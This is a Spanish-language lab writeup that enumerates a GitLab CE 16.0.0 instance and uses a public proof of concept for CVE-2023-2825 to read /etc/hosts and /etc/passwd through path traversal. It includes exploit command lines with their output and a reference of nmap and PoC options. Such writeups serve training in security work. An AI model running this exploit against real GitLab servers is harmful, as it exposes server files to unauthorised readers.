// 02

Enumeración web y CVE

4
PANTALLA DE LOGIN DE GITLAB

En http://10.129.229.69/ aparece el inicio de sesión de GitLab Community Edition. Lo importante no es el login, sino el enlace «Don't have an account yet? Register now»: la instancia permite registrarse sin invitación, y esa es la condición que necesita el exploit.

5
CREAR UNA CUENTA DE PRUEBA

Nos registramos con un nombre cualquiera, el usuario prueba (disponible) y la contraseña password.123, que es la que usa el PoC más adelante. El correo puede ser cualquiera.

// NOTA

Es una cuenta desechable de laboratorio. El PoC la necesita para crear grupos, proyectos y adjuntos, así que no hace falta ningún privilegio extra.

6
VERSIÓN DE GITLAB EN /HELP

La página de ayuda de GitLab (ruta /help) muestra su versión exacta:

GitLab Community Edition v16.0.0

// VERSIÓN AFECTADA

GitLab CE 16.0.0 es la versión que el PoC del CVE-2023-2825 declara como vulnerable. La versión exacta es el dato clave: con ella, el CVE y su PoC encajan sin más pruebas.

// 03

Preparación del PoC

7
CLONAR EL PoC PÚBLICO

Usamos el repositorio CVE-2023-2825-PoC. Según su descripción, el script inicia sesión con una cuenta válida, crea la estructura de grupos públicos anidados, crea un proyecto público, sube un adjunto y aprovecha la ruta de subida vulnerable para leer un archivo del servidor. También admite reutilizar una ruta de subida ya existente.

8
ENTORNO VIRTUAL Y DEPENDENCIAS

Si intentamos pip install directamente, Kali rechaza la instalación con externally-managed-environment (PEP 668). En lugar de forzarla con --break-system-packages, creamos un entorno virtual: es la opción limpia.

PIP
$ cd CVE-2023-2825-PoC
$ python3 -m venv venv
$ source venv/bin/activate
(venv) $ pip install -r requirements.txt
Successfully installed beautifulsoup4 certifi charset_normalizer idna requests soupsieve typing_extensions urllib3 [versiones recortadas]

// NOTA

El prompt (venv) confirma que pip instala dentro del entorno y no toca el Python del sistema. Hay que activar el venv en cada terminal nueva antes de lanzar el script.

Explotación

9

La primera ejecución hace todo el trabajo: crea los grupos, el proyecto y el adjunto, y después lee el archivo que pedimos. Probamos con /etc/hosts porque es pequeño y confirma que la lectura funciona:

--password 'password.123' \

// RUTA REUTILIZABLE

La línea Reusable upload path es la clave del PoC: guarda la ruta del adjunto que acabamos de subir. Las rutas (O1K-…, poc-… y el hash) son las de mi ejecución; en cada máquina cambian, así que hay que copiar la que imprima la tuya. Además, /etc/hosts ya revela el nombre getlab.htb.

10
REUTILIZAR LA RUTA: LEER /etc/hosts DE NUEVO

Con --reuse-path el script se salta la creación de grupos, proyecto y adjunto, y lee directamente desde la ruta guardada. Es mucho más rápido para leer varios archivos seguidos:

EXPLOIT
(venv)$ python3 cve_2023_2825.py \
--url http://10.129.229.69 \
--reuse-path '/O1K-1/…/O1K-11/poc-5pv75h6z/uploads/f2b044ff38dd5363fdabbca424c574fd/' \
--file /etc/hosts
[*] Using existing upload path
[*] Reading file: /etc/hosts
[+] Content of /etc/hosts

11
LECTURA DE /etc/passwd

Con la ruta reutilizable ya comprobada, pedimos /etc/passwd: la lista de usuarios del sistema con su shell de inicio.

EXPLOIT
(venv)$ python3 cve_2023_2825.py \
--url http://10.129.229.69 \
--reuse-path '/O1K-1/…/O1K-11/poc-5pv75h6z/uploads/f2b044ff38dd5363fdabbca424c574fd/' \
--file /etc/passwd
[*] Using existing upload path
[*] Reading file: /etc/passwd
[+] Content of /etc/passwd
root:x:0:0:root:/root:/bin/bash
[…]
sam:x:1000:1000:,,,:/home/sam:/bin/bash
[…]

// LECTURA ARBITRARIA DE ARCHIVOS

Dónde: la ruta de subida de adjuntos de GitLab, que el PoC hace atravesar hasta la raíz del sistema (path traversal).
Qué permite: leer cualquier archivo al que tenga acceso el usuario que ejecuta GitLab, con cualquier cuenta registrada y sin privilegios de administrador.
Resultado: /etc/passwd confirma los usuarios reales de la máquina, entre ellos root y sam (uid 1000, con shell /bin/bash).

Con esto queda demostrada la vulnerabilidad: el servidor entrega archivos del sistema a cualquier cuenta registrada.

// ALCANCE DEL WRITEUP

Este writeup documenta el reconocimiento, la identificación de GitLab 16.0.0 y la demostración del CVE-2023-2825: la lectura de archivos del servidor con el PoC, hasta /etc/passwd. El resto de la máquina no forma parte de esta publicación.

// NOTA

El PoC crea 11 grupos anidados antes del proyecto. Según su diseño, esa profundidad de ruta es lo que le permite recorrer directorios hacia arriba hasta la raíz del servidor: sin ella, la lectura no llega a /etc/passwd.

// 05

Referencia Comandos

ping
ping <IP> -c 3
Comprueba que la máquina responde antes de escanear. El TTL de la respuesta sugiere el sistema operativo.
  • -c 3 → envía 3 paquetes ICMP y termina.
nmap
sudo nmap -p- -sSCV -n -Pn --min-rate=5000 --open <IP> -oX salida.xml
Escaneo completo de puertos con detección de versiones y scripts. Así aparecen el SSH (22) y el GitLab sobre nginx (80).
  • -p- → Escanea los 65535 puertos TCP.
  • -sS → Escaneo SYN ("half-open"), rápido y discreto.
  • -sC → Lanza los scripts por defecto de nmap (NSE).
  • -sV → Detecta la versión exacta de cada servicio.
  • -n → No resuelve DNS.
  • -Pn → Trata el host como activo, sin ping previo.
  • --min-rate=5000 → Envía al menos 5000 paquetes por segundo.
  • --open → Muestra solo los puertos abiertos.
  • -oX → Guarda el resultado en XML.
xsltproc
xsltproc /usr/share/nmap/nmap.xsl salida.xml > salida.html
Transforma el XML de nmap en un informe HTML legible en el navegador.
  • nmap.xsl → Hoja de estilo oficial que da formato al informe.
python3 -m venv
python3 -m venv venv && source venv/bin/activate
Crea un entorno Python aislado donde instalar dependencias sin tocar el sistema. Es la alternativa limpia a --break-system-packages.
  • -m venv → Ejecuta el módulo que crea el entorno.
  • source venv/bin/activate → Activa el entorno en la terminal actual.
  • pip install -r requirements.txt → Instala las dependencias del PoC dentro del entorno.
cve_2023_2825.py
python3 cve_2023_2825.py --url <URL> --username <u> --password <p> --file <ruta>
Explota el CVE-2023-2825 para leer un archivo del servidor. La primera vez crea la estructura; después se reutiliza.
  • --url → Dirección de la instancia de GitLab.
  • --username / --password → Cuenta registrada en la instancia.
  • --file → Archivo del servidor que queremos leer.
  • --reuse-path → Ruta de subida ya creada, para no repetir el proceso.

// 06

Glosario

GitLab
Plataforma para alojar repositorios Git con wiki, incidencias e integración continua. Su edición Community es gratuita y autohospedable, y está escrita en Ruby on Rails.
CVE-2023-2825
Vulnerabilidad de lectura arbitraria de archivos en GitLab CE/EE 16.0.0, causada por un path traversal en la ruta de los adjuntos. Permite leer ficheros del servidor con los permisos del usuario que ejecuta GitLab.
Path traversal
Técnica que usa secuencias como ../ para salir del directorio previsto y acceder a rutas arbitrarias del sistema de ficheros. Es una de las vulnerabilidades más comunes en aplicaciones web con subida o lectura de archivos.
Registro público (self-registration)
Opción que permite crear cuentas sin invitación ni aprobación de un administrador. En esta máquina es la condición previa del exploit: sin cuenta, el PoC no puede crear proyectos ni adjuntos.
PoC — Proof of Concept
Código que demuestra que una vulnerabilidad es explotable. Antes de ejecutar un PoC ajeno contra cualquier objetivo conviene leerlo: decide qué peticiones envía y con qué datos.
Entorno virtual (venv)
Directorio con un intérprete de Python y sus propias dependencias, aislado del sistema. Es la práctica recomendada para instalar paquetes de un PoC sin modificar el Python de Kali.
PEP 668 — externally-managed-environment
Marcador que impide a pip instalar paquetes en el Python gestionado por el sistema operativo. Kali lo aplica, por eso el error aparece al instalar sin entorno virtual.
nginx
Servidor web y proxy inverso. En esta máquina sirve GitLab en el puerto 80 y responde también en el 8060, según indica el escaneo.
